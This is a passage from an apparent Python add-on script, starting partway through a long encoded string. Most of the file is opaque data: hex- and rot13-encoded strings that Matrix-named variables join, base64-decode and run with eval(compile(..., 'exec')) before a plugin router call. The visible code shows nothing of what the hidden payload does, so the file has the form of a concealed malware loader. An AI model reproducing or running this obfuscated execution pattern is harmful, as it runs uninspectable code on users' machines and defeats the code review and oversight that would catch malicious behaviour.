MzA3NDM4MzU0MjRkNmM2YTYyNTc3NjU4NDc2YjY3NzQ2MTZkNjM0YjQ2NDc1NDU4Njk2NjM3NDM2YzMwNTYzODY3NzUzMTczNGE3NzZmNGM0MjQ5MmY3MDQ0N2E0NjYzMzY0NzMwNjY2YzQ3NGQzOTQ1NTQ2YzczNmY1ODRiNzc2YTdhNGU3NjQ0NTUzNjQ1Nzc1ODU0MzE3ODRkMzE3OTQzNTU0NjZkMzE1NDYzMzM1YTUzNmUzNjRmNjUzMDZkMzE0MjQ5NzQ0ZTQxNmI2ODYzNGM0Njc1NmM2YTcxMzk1YTRjMzQ2MTM1NGU1MzcxMzczODZmNzYzMTUwMmI2YzYxNzQ2ZTcwNTA3ODQyMzMzNzJiNmQ3NjRkNDUzODRjMmYzNDcwNTY3OTYxNDk3MzM0NzczMzJiNzQ2MzZmMmI1NzZmNTU2MTc0NzA1ODU4NDI0OTUwNzkzMzM2NTM1NDM2MzczMDU0NDI1MjUyNTg2YjU3NTI0YjdhNTc3Mzc2NTU2YjQ2NzYzMzM1NTI2NDRmNmU2ZTc1NTQ3ODUwNzk3NTQ2MzA0YTU5NzI1NTU1NzU1YTUwMzQ2OTUwNTg0YTc4NTEzNDU3Nzk2NzdhNDYzMTM0Mzk2YjUzNzM0MTUxNzM2YjY4NmM1YTRhMzE3MzU2NDM3NTY4NDczNjczNGE1MzJmNGE2YzUxNGIzNTc1Njk0ZjU1N2E2MTZkNzU0NjY3NmYzNDJmNjI1NDczNzA3MjM1NDYzOTQzMzk1ODczNDc2ODMzNTA2OTJiNTU0YzY0NzI2MzM1Nzg1NTVhMmI2OTc2NTg3MDUxMzM0YTUxNzk0ZDcwNjI3MTY2NGE3Mjc1NDk0NDUxNzE1NjZjNjY3MjMyNzc0NDM5NmM0ZDU2NGQ0NjQyMzY2YzY4NjUzMDU4NDM3MDRhMzE0YTZjNTkzMjRmNjk1MTQyNDg2ZTUwNDc3Njc5NDYzMTRjNjY1MzQ4NDg2YjUwNTA0NTU4NjQ1YTU0MzE1YTQzNzg1ODUwNTU2NzVhNmQ3MTM0NTU0MzRlNTgyZjc4NmU3NzdhMzU1NDc1Njg1OTQ5NmM2NTMxNzg0ZjU2Mzc2OTc1MmY0NTYzNjU1MjMzMzY1NjY2NDk1NTU3NGI3NTRkNGY2NjU2Mzg2ZTRjNTE2YTU3NTQyYjRmNGY1NjQzNGU2MTVhNzM1Njc5NjY2YjQzNzQ1MjcwNDMzNzUyNjI2ZTRjMzE0YjQ0NjU2ZDRmNmMzNTM5NTU2MzQ1NWE2MjM3NmM1MTM1NzQ1YTU0MmY0YTczNTQzOTU0NGQzMzY4NjU0YzZlNDMyZjU3NTg1Njc4NjE0NTJiNmY3NTM0Nzc2ZDY2NmQ1NjJmNjE0ZTM4NTI2NjU2NmE1NzczNjk1MjVhMmI1OTc4NjIzNjUwMmI1YTU2NmE3MzUxMzc1NTU4MzE2NTY5NTM0ZTMwNjk1YTVhNTQ1NTcwMzkzMDU4NDY1YTY2NTU2MjZkMmI2OTJmNWE0ODYxN2EyZjZhMzI3MDU3Mzc3NDM1NTM3MTUxMzQ0YjYyNTU3NDY0NGY1NjQ2MmI0OTYyMmY1YTQ3NTU1NjYxNDg0NTM1NTU0YzY0Njg1NDJmMzE2Yjc1MmI0YTY4Nzg2NjMyNTgzNjU0NzY0MzYxNTc1OTJmNjE0NTc0Mzk1MzQ4NzI2NDM5NjI2MTQ2MmY3MDMxNGM2ZTZjNTYzNjY4NDczNTRiNmI0YTRiMzI2ZDZkNTU2NTZjNDM2ZjcyNTY3NTM1NGI2OTZjMzkzMzQ5NTY1ODRhNTc0ZjRhMzQ3NzZjMzM2NDMxNGM1NDczNjcyYjY0MmI2NzQ0NTc3OTU0NzQ1MzdhMzI3ODVhNmU3YTc5MmY0OTM4Mzc2MTU1MzMzOTQ3NDg0NzQ0Mzk3NzZhNTU1MzRlMzU2YTYyNTM1YTU4MzE3Njc2NmY1MjMyNmYyZjJiNTI0NDdhNTI1MTcyMzA3MzMzNGUzMDU1NGE3OTZlMzEzNTc4NDM0ODM1NmY0OTcyNTgzMTY1MzM3MDZlNzc1NzU0Mzk1MTM5MzY2MTc2NDM0YzMzN2E1MzczMmI2YzRiNDkyYjc0MzgzMDZkNGE0YTUzNTc1ODRkNjM2NTM3NTQ2NDRiNTY2YzZmNjc2MjY1NjU0ODU2Njk0OTMxNTE3YTM2NmY1MjMxNDU0ZjMxNTE3YTcxNTU3NjZjNzg3MjcyNWE0MTZkNDY2YzMzNmQ2NTY1NDUzOTM5NjM0MzMyNjk2NjM5NTk1Njc1MzY2ZDRmNmM3MTczNmU0OTZmMzg2ODY2NTQ2NjcyNzA2YzU0Njk2MzcxNGM2NTczNzU2MTY0NzI2ZTU5NjE2MzZhNTc0NzRlNGQ1NzRhNzE3NjYyNmM0OTMwNGE3NDM0Nzg1NTU4MzY2ZTY2MzQ3NTZiNGM1ODU0MzE1MjU4NzE1MTc2NGU0YzMzNzc2MzcwNzg2ODY3NmU2ZDYyMzk2NDQzNDkzMTQ3MzMzNzJiNTI1NjZkMmI2YjQ3NzI0ZDRiNzg2MjY5NzIzNjU0NGI0Mzc2NTc1NzZjNGQ0NTcwMzc2ZDY3NTgzNDZjMzMzODcwNTU2NTcwN2EzNjczNGE0MjM2NTY3NTQ5NjkzNTRlMzk1OTZhMzAyZjUyNGUzMTU2MzYzNDRmNDU2ZTY1NmMzMzcwNDEzODdhNjYzNjYyNTY3NzUwNzQ3MTYyMmY2NzZjNTQ2MTcwNDg3YTZiMmYyZjU4NGY1NTc1NGE0NzM4N2E1ODdhNzQ0NzQ3NGE2MjU1NzY0ZjQ2NTM2OTc0NTg0YjUzNzk3MDc1MzY1Nzc2NDkzNzM3NGE2YzU1NzA1NDcxNTAzNTUzNzkyZjQ2NzE0NTcxNmQ2NTc1MzAzNzc5NmQ3NTQzNjE2YjcyNzA3NTc5Njc0ZTM2NGU2YzMwNzQ1YTRlNzc3OTQ0MzAyYjU1NTUzOTZiNzYyYjYxNmY0ODQ3NTc2NTU0MmYzNzRkNjU0YTMzMzc1NDdhMzU2YzY2NjM2ZjZiNGM2ZjU2NDU3YTc4MzY2MjRmNzA0MzJiMzU0MjZiNTg2MzMxNjg0ZDMxMzA3NjJiNzE3Njc5NzI1YTMzMmI2ZTcwNWEzMTRjNjYyYjc4NGU0NjU2NzEzNDQ1NzM2NTM1NGU3MTU3MmY1NzRhMzY3YTM5MzU2NDZmNDI3MjM1NDE0OTc0NTY0ODc5NTMzNTU2NGM1MDUzNjIzOTQ3NzU3NDUyMzE0ZDJiNDk1ODMxMzQ0YTQ4NTU1NDY2NTA3NTc1NzM3MjM1NzE0OTc0NWEzNTUxNmY0YjU3NTA2ODRiMzE0YTQ5NTM1NjRmNzM2ODJiNGMzNTUxNzE1NzM5NDk0NzcwNTg0MjZiMzE3Njc5NmE0NDMwMzc1NTRlMzI1NTJiNTE1MDZiN2E3OTcyNjQ1MzU4NzY0OTRiNTQzODcxNzE2OTU1NGM1MDc0Mzk1YTM5MzE2MTJmNzI1NjY2MmY0ZDRiNmM0ZTU0NzgzMzQxMmYzNzM4Njg3NTY4NTM2Zjc0MmY1NDUwNzQ3NTJmNzQ2NTU2NTE0ZTZjNDg2YjQ3NzM3ODcwNGQzNDUwNTUzMTM4NzQyYjc4MmY1NDZjNTM3NDY1Mzg1YTU0Mzk2YTRlNTA1NTQ2MzAyZjc4NjIzMDc4NTg3ODQyNmQyZjM4NTY1MjY2NzU2MTYzNzAzMzZmNTU0YjRjNjY3MzZhNjM2ODU2NTIzNDZhN2EzOTc1NmQ3MDMxNDk1MjU3NWE3NTQzMzEzMTJmNTU1MzVhMzU3MjRlNTQ1ODZiNjM3MzQzMzE1NjJmNWE1MDMwMzI1NTYzNTQ1YTMzMmI2ZDRhNDU2OTc4NTg0YzUwNTYzODZmNjk2YTdhNzk2OTY2MzM2ODU2Njc2ZTcxNzc2YzU4NjY1NjM1NmM2YzM2NzU2NzcwNmY3NzM'
keymaker = '3ZmL2AQZ2AGZlMwMuAGZ1AwZ5Amx3BGEuAzVmAGD2ZmD0MGMwZmV1AwMxATL3ZQZmAmV3ZQL2Zmp2LGp2AzDmZQHjZmt2ZmplATV3ZGZ3ZmN3ZwLmAGRlMwZ2AGL0AmWvAmR0MGp1AzV1ZQEuZzV2LmD0AmNmAQMzAmp1AwExZzLmAmHkAmV0AwL0AzR2ZGp0AmHlLwDkAGL2ZGL1AmR0LGZ4AmD2LGH0AGL1BQp3ZmR1AGLlAwp3LGp1AGR0LGMzAwLmAwZkAzH2LmEvAmHlMwHkAmLlLwH4ATVmBQEzAGp1BQEzAQH2MQMyAzD1AmL1ZmR0ZwD3AzVmZGMvAmZmBGHkAmLmBQH3ZmZmZwDlAwL1ZGLkAmVmZmLkAwR2Mwp2ATZ2MGEuZmRlMwMvAwRmAmHmAzHmZQquAGt2ZmH3AGH2ZmH3AGZ3AwD5AJR1AmplZzL3AQExAGL0AQEwAzZ0ZmH0Awt3BQL4AQtmAGEyAGNlLwH2Zmx3AmMuAmL3ZmH0Zmp1ZQp2AQH2ZwMyZzLmBQWzAmD3AwZkATL0AwHmAQtmAwWzAQp2AQWvZmp1ZQMxAwp3ZQp4AGZ2MGZmAmL0BGDlAwL2AwDmZmp2ZGEuAmR0LmpmATZmAGZ2AmL0ZwZmAwZ2LmZlAQHmBQZ3AzRlMwZ0AmR0LGZ5AQp0ZGH4ZmZ2AmWzZmZ0ZmZjAmD3AmD0AGD3ZwMyAGtmZmD2Amx0AwMvZmx2AGHlZmNlLwMxAGZ2ZGZmAwp3ZwEvAmD2AwL5AmH0ZGH4ZmZmZGpmAzVmZGZ4Zmx2AwMvZmR3ZmZmAQx2BQHmAGVlMwMuAwt3AmZ0AzR0BQEyZmR1BGp0AwH1Zmp1AwZ2LmD2ATR1ZmL1ZmR2ZGpkAmx2MwLkZmpmAGZ0AmV0ZwD3ZmH2MQLkAJR3AmHlZmN2AQp5ZmH1AQDmZzV2ZmD2ZmLmAGp0ZmxmAGH0AGt3AGD2Amp0ZmpkAwH0MQH4AQD0LGL2ATL0AmEuAGL0AGH4ATD1ZQZmA2R1BQEuAmV1BQHkAzD2LGpjAzZ0AwquAzD1LGD1ATZ2MQMyAGt2LwZ3AmDmZmMwAGD0AGZ3Zmt2BQZ0ZzL3AGD4ZmxlLwD5ZmpmBGp2ZmD1ZGL0AGt2ZmMxATV2AQHmAwplLwLmAwVlLwEwZmV2LwL4AmD0BGD0AmH3ZQLkA2R2BQMwZmD1AwL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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
